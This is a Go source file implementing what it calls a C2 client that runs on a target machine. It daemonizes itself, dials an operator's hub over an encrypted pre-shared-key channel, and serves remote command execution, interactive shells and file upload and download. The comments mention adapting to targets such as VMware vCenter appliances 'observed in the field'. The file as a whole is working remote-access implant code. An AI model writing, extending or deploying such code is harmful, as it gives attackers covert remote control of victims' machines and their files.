// Package agent is the C2 client that runs on a target machine: it dials the hub,
// authenticates via the Noise PSK, daemonizes (detaches from its parent), and serves
// exec / interactive-shell / filesystem operations over the wire protocol. It never
// speaks MCP — only the wire protocol to the hub.
package agent

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"sync"
	"syscall"
	"time"

	"debugmcp/internal/crypto"
	"debugmcp/internal/daemon"
	"debugmcp/internal/wire"
)

// Default caps advertised when not overridden.
const (
	DefaultConcurrencyCap = 8
	DefaultMaxFileSize    = 256 << 20 // 256 MiB
)

// Options configure an Agent.
type Options struct {
	HubAddr  string // host:port to dial
	PSK      []byte
	ID       string // claimed agent id; auto-generated when empty
	NoDaemon bool   // skip daemonization (tests)
	Cap      int
}

// Agent is one C2 client connected to the hub.
type Agent struct {
	opts Options
	conn *crypto.Conn

	mu      sync.Mutex
	shells  map[string]*shellSession
	nextSid uint64

	fsMu      sync.Mutex
	uploads   map[string]*chunkedUpload
	downloads map[string]*chunkedDownload
}

// New constructs an Agent (does not connect).
func New(o Options) *Agent {
	if o.Cap <= 0 {
		o.Cap = DefaultConcurrencyCap
	}
	if o.ID == "" {
		o.ID = autoID()
	}
	return &Agent{
		opts: o, shells: make(map[string]*shellSession),
		uploads: make(map[string]*chunkedUpload), downloads: make(map[string]*chunkedDownload),
	}
}

// Run daemonizes (unless NoDaemon), dials the hub, handshakes, and serves until
// the connection closes.
func (a *Agent) Run(ctx context.Context) error {
	if !a.opts.NoDaemon {
		_ = daemon.Daemonize()
	}
	d := net.Dialer{Timeout: 10 * time.Second}
	nc, err := d.DialContext(ctx, "tcp", a.opts.HubAddr)
	if err != nil {
		return fmt.Errorf("agent: dial %s: %w", a.opts.HubAddr, err)
	}
	conn, err := crypto.Handshake(nc, crypto.Config{PSK: a.opts.PSK, Initiator: true})
	if err != nil {
		nc.Close()
		return fmt.Errorf("agent: handshake: %w", err)
	}
	a.conn = conn

	if err := a.sendHello(); err != nil {
		return err
	}
	if err := a.serve(ctx); err != nil {
		return err
	}
	return nil
}

func (a *Agent) sendHello() error {
	hostname, _ := os.Hostname()
	shell := resolveShell()
	hello := &wire.Hello{
		AgentID:  a.opts.ID,
		Hostname: hostname,
		Platform: runtime.GOOS,
		Arch:     runtime.GOARCH,
		Shell:    shell,
		Caps: wire.Capabilities{
			ConcurrencyCap: a.opts.Cap,
			MaxFileSize:    DefaultMaxFileSize,
			AgentVersion:   "0.1.0",
		},
	}
	env, _ := wire.Encode(wire.MsgHello, 0, "", hello)
	return a.conn.Send(env)
}

// serve reads requests and dispatches them, replying with the same Seq.
func (a *Agent) serve(ctx context.Context) error {
	for {
		env, err := a.conn.Recv()
		if err != nil {
			return fmt.Errorf("agent: recv: %w", err)
		}
		go a.handle(env)
	}
}

func (a *Agent) reply(seq uint64, sid string, t wire.MsgType, body any) {
	env, _ := wire.Encode(t, seq, sid, body)
	_ = a.conn.Send(env)
}

func (a *Agent) replyErr(seq uint64, sid, code, msg string) {
	a.reply(seq, sid, wire.MsgError, wire.ErrorMsg{Code: code, Message: msg})
}

func (a *Agent) handle(env *wire.Envelope) {
	switch env.Type {
	case wire.MsgHeartbeat:
		a.mu.Lock()
		active := len(a.shells)
		a.mu.Unlock()
		a.reply(env.Seq, env.Sid, wire.MsgHeartbeatAck, &wire.HeartbeatAck{
			SessionsActive: active,
			Load:           wire.LoadInfo{SessionsActive: active},
		})

	case wire.MsgExecRequest:
		req, err := wire.Decode[wire.ExecRequest](env)
		if err != nil {
			a.replyErr(env.Seq, env.Sid, "bad_request", err.Error())
			return
		}
		a.reply(env.Seq, env.Sid, wire.MsgExecResult, a.execOne(req))

	case wire.MsgShellOpen:
		req, err := wire.Decode[wire.ShellOpen](env)
		if err != nil {
			a.replyErr(env.Seq, env.Sid, "bad_request", err.Error())
			return
		}
		a.shellOpen(env, req)
	case wire.MsgShellSend:
		req, err := wire.Decode[wire.ShellSend](env)
		if err != nil {
			a.replyErr(env.Seq, env.Sid, "bad_request", err.Error())
			return
		}
		a.shellSend(env, req)
	case wire.MsgShellRead:
		req, err := wire.Decode[wire.ShellRead](env)
		if err != nil {
			a.replyErr(env.Seq, env.Sid, "bad_request", err.Error())
			return
		}
		a.shellRead(env, req)
	case wire.MsgShellClose:
		a.shellClose(env)
	case wire.MsgSignal:
		req, err := wire.Decode[wire.Signal](env)
		if err != nil {
			a.replyErr(env.Seq, env.Sid, "bad_request", err.Error())
			return
		}
		a.shellSignal(env, req)

	case wire.MsgFSWriteOpen:
		req, err := wire.Decode[wire.FSWriteOpen](env)
		if err != nil {
			a.replyErr(env.Seq, env.Sid, "bad_request", err.Error())
			return
		}
		a.fsWriteOpen(env, req)
	case wire.MsgFSWriteChunk:
		req, err := wire.Decode[wire.FSWriteChunk](env)
		if err != nil {
			a.replyErr(env.Seq, env.Sid, "bad_request", err.Error())
			return
		}
		a.fsWriteChunk(env, req)
	case wire.MsgFSWriteCommit:
		req, err := wire.Decode[wire.FSWriteCommit](env)
		if err != nil {
			a.replyErr(env.Seq, env.Sid, "bad_request", err.Error())
			return
		}
		a.fsWriteCommit(env, req)
	case wire.MsgFSReadOpen:
		req, err := wire.Decode[wire.FSReadOpen](env)
		if err != nil {
			a.replyErr(env.Seq, env.Sid, "bad_request", err.Error())
			return
		}
		a.fsReadOpen(env, req)
	case wire.MsgFSReadChunk:
		req, err := wire.Decode[wire.FSReadChunk](env)
		if err != nil {
			a.replyErr(env.Seq, env.Sid, "bad_request", err.Error())
			return
		}
		a.fsReadChunk(env, req)

	case wire.MsgGoodbye:
		_ = a.conn.Close()
	default:
		a.replyErr(env.Seq, env.Sid, "unknown_op", "unknown message type "+env.Type.String())
	}
}

// execOne runs a one-shot command via the target login shell (bash -lc, cmd /c,
// pwsh -c), capturing stdout/stderr/exit. Completion is authoritative (waitpid).
func (a *Agent) execOne(req *wire.ExecRequest) *wire.ExecResult {
	shell := req.Shell
	if shell == "" {
		shell = resolveShell()
	}
	args, err := shellWrapArgs(shell, req.Command)
	if err != nil {
		return &wire.ExecResult{Completion: wire.CompletionAuthoritative, ExitCode: -1, Stderr: []byte(err.Error())}
	}
	ctx := context.Background()
	var cancel context.CancelFunc
	if req.TimeoutMs > 0 {
		ctx, cancel = context.WithTimeout(ctx, time.Duration(req.TimeoutMs)*time.Millisecond)
		defer cancel()
	}
	c := exec.CommandContext(ctx, shell, args...)
	var stdout, stderr bytes.Buffer
	c.Stdout = &stdout
	c.Stderr = &stderr
	start := time.Now()
	runErr := c.Run()
	res := &wire.ExecResult{
		Stdout:     stdout.Bytes(),
		Stderr:     stderr.Bytes(),
		DurationMs: time.Since(start).Milliseconds(),
		Completion: wire.CompletionAuthoritative,
	}
	switch {
	case errors.Is(runErr, context.DeadlineExceeded):
		res.Completion = wire.CompletionHardTimeout
		res.ExitCode = -1
	case runErr == nil:
		res.ExitCode = 0
	default:
		var ee *exec.ExitError
		if errors.As(runErr, &ee) {
			if ws, ok := ee.Sys().(syscall.WaitStatus); ok {
				if ws.Signaled() {
					res.Signal = ws.Signal().String()
					res.ExitCode = -1
				} else {
					res.ExitCode = int32(ws.ExitStatus())
				}
			} else {
				res.ExitCode = int32(ee.ExitCode())
			}
		} else {
			res.ExitCode = -1
			res.Stderr = append(res.Stderr, []byte(runErr.Error())...)
		}
	}
	return res
}

// --- filesystem ---
// 单发 FSRead/FSWrite/FSList/FSStat 已移除；upload/download 走分块路径（见 agent_fs_chunk.go）。
// file_list/file_stat 现在由 exec(ls/stat) 替代。

// --- helpers ---

// resolveShell returns the shell the agent should use by default for one-shot
// exec and interactive PTY sessions. It locates bash on the system instead of
// trusting $SHELL: on targets where $SHELL points at a restricted shell — e.g.
// VMware vCenter's /bin/appliancesh, which rejects -lc and demands its own auth
// — $SHELL is unusable as a default. bash is probed via well-known absolute
// paths first (the agent's PATH may be sparse under daemonization), then via
// PATH lookup. Only when bash is absent does it fall back to $SHELL (skipping
// known-restricted shells) and finally /bin/sh.
func resolveShell() string {
	if runtime.GOOS == "windows" {
		// Prefer bash when Git Bash / WSL is available; else the command interpreter.
		if p, err := exec.LookPath("bash"); err == nil {
			return p
		}
		return "cmd.exe"
	}
	for _, c := range []string{"/bin/bash", "/usr/bin/bash", "/usr/local/bin/bash"} {
		if fi, err := os.Stat(c); err == nil && !fi.IsDir() {
			return c
		}
	}
	if p, err := exec.LookPath("bash"); err == nil {
		return p
	}
	if s := os.Getenv("SHELL"); s != "" && !isRestrictedShell(s) {
		return s
	}
	return "/bin/sh"
}

// isRestrictedShell reports whether name is a known restricted/non-POSIX shell
// that must not be used with login-shell flags like -lc. Restricted shells have
// their own command sets (and sometimes auth) and reject POSIX flags, so they
// are never a safe default even when set as $SHELL. Listed here only after being
// observed in the field: VMware vCenter VCSA ships /bin/appliancesh (backend:
// main-shell).
func isRestrictedShell(name string) bool {
	switch filepath.Base(name) {
	case "appliancesh", "main-shell":
		return true
	}
	return false
}

// shellWrapArgs returns the argv to run `command` under the given shell so that
// shell syntax (pipes, redirects, $(), loops) works.
func shellWrapArgs(shell, command string) ([]string, error) {
	name := filepath.Base(shell)
	switch name {
	case "cmd.exe", "cmd":
		return []string{"/c", command}, nil
	case "powershell.exe", "pwsh", "powershell":
		return []string{"-NoProfile", "-Command", command}, nil
	default: // bash, sh, zsh, dash, ash, ...
		return []string{"-lc", command}, nil
	}
}

func autoID() string {
	host, _ := os.Hostname()
	if host == "" {
		host = "agent"
	}
	return fmt.Sprintf("%s-%d", host, time.Now().UnixNano()&0xffff)
}
